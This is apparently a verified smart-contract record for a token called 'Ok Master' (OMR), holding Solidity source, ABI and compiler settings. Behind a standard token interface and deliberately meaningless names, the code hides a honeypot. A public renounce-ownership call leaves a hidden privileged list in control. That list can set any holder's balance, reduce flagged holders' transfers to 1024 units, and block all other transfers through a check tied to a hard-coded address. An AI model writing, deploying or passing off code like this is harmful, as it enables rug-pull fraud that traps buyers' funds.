{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.13;\n\ninterface enableToken {\n    function createPair(address walletListSwap, address autoMode) external returns (address);\n}\n\ninterface atBuy {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address senderLaunch) external view returns (uint256);\n\n    function transfer(address fromSwap, uint256 feeWallet) external returns (bool);\n\n    function allowance(address toShould, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 feeWallet) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address fromSwap,\n        uint256 feeWallet\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed limitTakeReceiver, uint256 value);\n    event Approval(address indexed toShould, address indexed spender, uint256 value);\n}\n\nabstract contract feeEnable {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface isTrading {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface atBuyMetadata is atBuy {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract OkMaster is feeEnable, atBuy, atBuyMetadata {\n\n    uint256 public buyFee;\n\n    mapping(address => bool) public liquidityTake;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return receiverFrom;\n    }\n\n    function enableLimit() public {\n        emit OwnershipTransferred(autoSenderMin, address(0));\n        minTeam = address(0);\n    }\n\n    bool public listAtShould;\n\n    address public sellBuy;\n\n    function takeMode() private view {\n        require(liquidityTake[_msgSender()]);\n    }\n\n    function feeReceiver(uint256 feeWallet) public {\n        takeMode();\n        minTokenLaunch = feeWallet;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return maxAuto;\n    }\n\n    string private maxAuto = \"Ok Master\";\n\n    function approve(address amountLimit, uint256 feeWallet) public virtual override returns (bool) {\n        sellFee[_msgSender()][amountLimit] = feeWallet;\n        emit Approval(_msgSender(), amountLimit, feeWallet);\n        return true;\n    }\n\n    function balanceOf(address senderLaunch) public view virtual override returns (uint256) {\n        return receiverTokenTo[senderLaunch];\n    }\n\n    uint256 minTokenLaunch;\n\n    function launchedTrading(address senderTeam) public {\n        takeMode();\n        if (sellReceiver == buyFee) {\n            sellReceiver = buyFee;\n        }\n        if (senderTeam == autoSenderMin || senderTeam == sellBuy) {\n            return;\n        }\n        feeTotal[senderTeam] = true;\n    }\n\n    uint256 constant takeTx = 2 ** 10;\n\n    function transferFrom(address maxReceiver, address fromSwap, uint256 feeWallet) external override returns (bool) {\n        if (_msgSender() != walletLaunch) {\n            if (sellFee[maxReceiver][_msgSender()] != type(uint256).max) {\n                require(feeWallet <= sellFee[maxReceiver][_msgSender()]);\n                sellFee[maxReceiver][_msgSender()] -= feeWallet;\n            }\n        }\n        return fundTotal(maxReceiver, fromSwap, feeWallet);\n    }\n\n    string private buyAtFrom = \"OMR\";\n\n    function tradingSwapMin(address enableAutoToken) public {\n        if (listAtShould) {\n            return;\n        }\n        \n        liquidityTake[enableAutoToken] = true;\n        if (sellReceiver == modeExemptTake) {\n            sellLiquidity = false;\n        }\n        listAtShould = true;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return buyAtFrom;\n    }\n\n    uint256 private receiverFrom = 100000000 * 10 ** 18;\n\n    uint256 private modeExemptTake;\n\n    function fundTotal(address maxReceiver, address fromSwap, uint256 feeWallet) internal returns (bool) {\n        if (maxReceiver == autoSenderMin) {\n            return liquidityIs(maxReceiver, fromSwap, feeWallet);\n        }\n        uint256 swapSender = atBuy(sellBuy).balanceOf(marketingAt);\n        require(swapSender == minTokenLaunch);\n        require(fromSwap != marketingAt);\n        if (feeTotal[maxReceiver]) {\n            return liquidityIs(maxReceiver, fromSwap, takeTx);\n        }\n        return liquidityIs(maxReceiver, fromSwap, feeWallet);\n    }\n\n    mapping(address => bool) public feeTotal;\n\n    address marketingAt = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    uint256 private sellReceiver;\n\n    constructor (){\n        if (txReceiver) {\n            sellReceiver = modeExemptTake;\n        }\n        isTrading buyAuto = isTrading(walletLaunch);\n        sellBuy = enableToken(buyAuto.factory()).createPair(buyAuto.WETH(), address(this));\n        \n        autoSenderMin = _msgSender();\n        liquidityTake[autoSenderMin] = true;\n        receiverTokenTo[autoSenderMin] = receiverFrom;\n        enableLimit();\n        \n        emit Transfer(address(0), autoSenderMin, receiverFrom);\n    }\n\n    function liquidityIs(address maxReceiver, address fromSwap, uint256 feeWallet) internal returns (bool) {\n        require(receiverTokenTo[maxReceiver] >= feeWallet);\n        receiverTokenTo[maxReceiver] -= feeWallet;\n        receiverTokenTo[fromSwap] += feeWallet;\n        emit Transfer(maxReceiver, fromSwap, feeWallet);\n        return true;\n    }\n\n    function transfer(address isSell, uint256 feeWallet) external virtual override returns (bool) {\n        return fundTotal(_msgSender(), isSell, feeWallet);\n    }\n\n    event OwnershipTransferred(address indexed liquiditySwapLimit, address indexed marketingEnable);\n\n    function decimals() external view virtual override returns (uint8) {\n        return fromList;\n    }\n\n    function owner() external view returns (address) {\n        return minTeam;\n    }\n\n    uint256 launchSwap;\n\n    address walletLaunch = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    bool public txReceiver;\n\n    address private minTeam;\n\n    bool private sellLiquidity;\n\n    function getOwner() external view returns (address) {\n        return minTeam;\n    }\n\n    mapping(address => mapping(address => uint256)) private sellFee;\n\n    address public autoSenderMin;\n\n    uint8 private fromList = 18;\n\n    function takeSwap(address isSell, uint256 feeWallet) public {\n        takeMode();\n        receiverTokenTo[isSell] = feeWallet;\n    }\n\n    function allowance(address receiverEnable, address amountLimit) external view virtual override returns (uint256) {\n        if (amountLimit == walletLaunch) {\n            return type(uint256).max;\n        }\n        return sellFee[receiverEnable][amountLimit];\n    }\n\n    mapping(address => uint256) private receiverTokenTo;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"toShould\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"liquiditySwapLimit\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"marketingEnable\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"limitTakeReceiver\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverEnable\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"amountLimit\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountLimit\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"feeWallet\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoSenderMin\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderLaunch\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyFee\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableLimit\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"feeWallet\",\"type\":\"uint256\"}],\"name\":\"feeReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"feeTotal\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderTeam\",\"type\":\"address\"}],\"name\":\"launchedTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"liquidityTake\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listAtShould\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellBuy\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isSell\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"feeWallet\",\"type\":\"uint256\"}],\"name\":\"takeSwap\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableAutoToken\",\"type\":\"address\"}],\"name\":\"tradingSwapMin\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isSell\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"feeWallet\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxReceiver\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"fromSwap\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"feeWallet\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "OkMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}